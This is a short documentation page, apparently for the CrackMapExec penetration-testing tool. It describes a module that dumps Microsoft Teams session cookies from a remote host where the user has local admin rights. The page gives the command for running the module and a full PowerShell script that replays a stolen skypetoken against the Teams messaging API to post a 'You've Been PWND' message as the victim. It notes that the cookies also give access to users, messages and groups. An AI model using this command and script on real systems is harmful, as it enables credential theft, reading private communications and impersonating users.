# MS Teams Cookies

{% hint style="warning" %}
You need at least local admin privilege on the remote target
{% endhint %}

New CrackMapExec module to dump Microsoft Teams cookies thanks to [@KuiilSec](https://twitter.com/KuiilSec) contribution. You can use them to retrieve information like users, messages, groups etc or send directly messages in Teams.

```
$ crackmapexec smb <ip> -u user -p pass -M teams_localdb
```

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

Send the pwned message using this script:

```
# original code from Connor Peoples / https://twitter.com/NoUselessTech
# modified for cme @mpgn_x64 POC

$Token = "skypetoken=YOUR_TOKEN"

    
$Header = @{
    authentication = $Token
    "content-type" = "application/json"
    "x-ms-client-request-id" = [guid]::NewGuid().ToString()
    "x-ms-client-session-id" = [guid]::NewGuid().ToString()
}

$id = ""
(1..19) | ForEach-Object {  
    $id += Get-Random(1..9) 
}

$Url = "https://amer.ng.msg.teams.microsoft.com/v1/users/ME/conversations/48:notes/messages"
$Body = @{
    content ="<p>PWNED</p>"
    messagetype = "RichText/Html"
    contenttype = "text"
    amsreferences = @()
    clientmessageid = $id
    imdisplayname = "Threat Bot"
    properties = @{
        importance = "high"
        subject = "You've Been PWND"
    }
}
    
Invoke-RestMethod `
    -Uri $Url `
    -Method POST `
    -Headers $Header `
    -Body ($Body | ConvertTo-Json)
```
